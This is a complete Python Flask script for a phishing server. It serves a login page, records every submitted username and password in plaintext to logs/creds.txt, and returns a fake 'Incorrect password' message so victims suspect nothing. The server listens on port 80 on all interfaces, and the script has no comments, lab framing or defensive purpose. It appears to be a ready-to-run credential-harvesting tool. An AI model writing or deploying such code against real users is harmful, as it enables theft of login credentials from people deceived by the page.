#!/usr/bin/env python3
from flask import Flask, request
import os
import datetime

app = Flask(__name__)
os.makedirs("logs", exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{now}] Username: {username} | Password: {password}\n"
        print(entry.strip())
        with open("logs/creds.txt", "a") as f:
            f.write(entry)
        return "<h3 style='text-align:center'>Incorrect password. Try again later.</h3>"

    return open("login.html").read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
